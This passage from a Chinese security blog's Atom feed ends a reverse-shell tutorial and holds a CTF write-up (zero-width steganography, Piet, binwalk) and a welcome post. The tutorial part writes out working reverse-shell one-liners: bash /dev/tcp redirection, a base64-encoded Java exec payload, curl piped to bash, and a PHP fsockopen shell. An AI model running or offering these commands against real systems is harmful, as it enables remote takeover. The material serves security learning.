下载这个文件并且执行，达到用 Bash 重定向相同的效果</p><p>首先，在攻击者 vps 的 web 目录里面创建一个 index 文件（index.php 或 index.html），内容如下：</p><p><code>bash -i &gt;&amp; /dev/tcp/Target_IP/Target_Port 0&gt;&amp;1</code>  或者 <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/Target_IP/Target_Port 0&gt;&amp;1&quot;</code> ，而 java 的 RCE 需要用 base64 编码，Payload: <code>Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</code></p><p>然后在目标机上执行如下，即可反弹 shell</p><p><code>curl Target_IP|bash</code></p><h4 id="php反弹shell"><a class="markdownIt-Anchor" href="#php反弹shell">#</a> php 反弹 shell</h4><p>攻击机：  <code>nc -nvlp Target_port</code></p><p>靶机：  <code>php -r '$sock=fsockopen(&quot;192.168.37.131&quot;,1234);     exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</code></p><h4 id="others"><a class="markdownIt-Anchor" href="#others">#</a> <strong>Others</strong></h4><p>反弹 shell 的方式很多，nc 和 bash 是比较常见的方式，其他还有 Telnet，Socat 等工具可以反弹 shell，或者写个 python，php 等脚本也可以反弹 shell，比较琐碎的内容具体遇到了再查即可。</p><p>————END————</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;反弹shell&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#反弹shell&quot;&gt;#&lt;/a&gt; 反弹 shell&lt;/h1&gt;
&lt;h2 id=&quot;反弹shell-2&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#反弹s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hgame FINAL WP</title>
    <link href="http://example.com/2024/04/06/Hgame-FINAL-WP/"/>
    <id>http://example.com/2024/04/06/Hgame-FINAL-WP/</id>
    <published>2024-04-06T05:09:37.000Z</published>
    <updated>2024-04-06T15:45:00.013Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hgame-final-wp"><a class="markdownIt-Anchor" href="#hgame-final-wp">#</a> Hgame FINAL WP</h1><h3 id="author-fc04db"><a class="markdownIt-Anchor" href="#author-fc04db">#</a> author: Fc04dB</h3><h4 id="1看不见的字"><a class="markdownIt-Anchor" href="#1看不见的字">#</a> 1. 看不见的字</h4><p>题目提示 npm install zero-width-lib , 网上搜了一下，是零宽字符隐藏文本加密（npm 没有研究，最后发现也没用到），翻了很多文章，找到一个在线解密的网站:</p><pre><code>https://yuanfux.github.io/zero-width-web/</code></pre><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/5o1U97eAqYQismD.png" alt="image-5.png"></p><p>直接得到 flag</p><p>顺便贴一张其他人写的脚本</p><pre><code>import * as z from 'zero-width-lib';// 这是要解密的字符串，包含零宽度字符const encodedString = 'h\uFEFF\u200E\uFEFF\u200B\uFEFF\u200E\u200D\u200B\u200D\uFEFF\u200C\u200B\uFEFF\u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\uFEFF\uFEFF\u200D\u200B\uFEFF\u200D\uFEFF\u200B\u200C\u200E\u200F\u200B\uFEFF\u200F\u200D\u200B\u200D\uFEFF\uFEFF\u200B\u200F\uFEFF\u200D\u200B\uFEFF\u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\u200D\uFEFF\u200E\u200B\uFEFF\u200E\uFEFF\u200B\uFEFF\u200E\u200D\u200B\u200D\uFEFF\u200C\u200B\uFEFF\u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\u200D\uFEFF\u200E\u200B\uFEFF\u200E\u200C\u200B\u200F\uFEFF\uFEFF\u200B\uFEFF\u200C\u200E\u200B\u200C\u200E\u200C\u200B\uFEFF\u200F\u200D\u200B\u200F\u200E\u200E\u200Eello';// 使用zero-width-lib的decode方法来解密字符串const decoded = z.decode(encodedString);console.log(decoded);</code></pre><h4 id="2逮虾户"><a class="markdownIt-Anchor" href="#2逮虾户">#</a> 2. 逮虾户</h4><p>附件一个 dmg 文件是 moc 系统磁盘文件，7z 直接提取，一个需要密码的压缩包，一个 png 文件，密码应该就在 png 文件里，然后用 binwalk,foremost,stegsolve,zsteg，好多工具都找不到隐写内容，后来在学长的提示下是 piet 编程语言，然后下载 npiet 执行文件得到密码</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/G8mMqgDk1SsWvZY.png" alt="image-1.png"></p><p>打开 7z 文件，是一个逮虾户歌曲，尝试 MP3 隐写的解题方法，一无所获，再次请教学长，<br>信息在歌词里，想着把歌词提取出来，最后利用 elisa 播放器找到 passward</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/LNGMryJA8k6wZ1P.png" alt="image-2.png"></p><pre><code>q:UVmoa,Qo^Dp.D9e#wsFUm059mhNT</code></pre><p>诶？长得也不像 flag，然后学长提醒有一个 zip 文件没找到，用 binwalk 处理那个 MP3 文件，提取到 zip 文件</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/cOj7TSAnlZ6RYoe.png" alt="image-3.png"></p><p>打开之后是一个 jdvu 文件，记事本打不开，百度，要下载 windjview，然后就可以看到 flag</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/v6Ft4xIYHSd7LAk.png" alt="image-4.png"></p><pre><code>Hgame&#123;d3j45_i_kn0w&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;hgame-final-wp&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#hgame-final-wp&quot;&gt;#&lt;/a&gt; Hgame FINAL WP&lt;/h1&gt;
&lt;h3 id=&quot;author-fc04db&quot;&gt;&lt;a class=&quot;markd</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Welcome to Fc04dB&#39;s BLOG</title>
    <link href="http://example.com/2024/04/03/My-New-Post/"/>
    <id>http://example.com/2024/04/03/My-New-Post/</id>
    <published>2024-04-03T12:29:21.000Z</published>
    <updated>2024-04-06T05:15:32.675Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WELCOME"><a href="#WELCOME" class="headerlink" title="WELCOME!!!!!"></a>WELCOME!!!!!</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WELCOME&quot;&gt;&lt;a href=&quot;#WELCOME&quot; class=&quot;headerlink&quot; title=&quot;WELCOME!!!!!&quot;&gt;&lt;/a&gt;WELCOME!!!!!&lt;/h1&gt;</summary>
      
    
    
    
    
  </entry>
  
</feed>
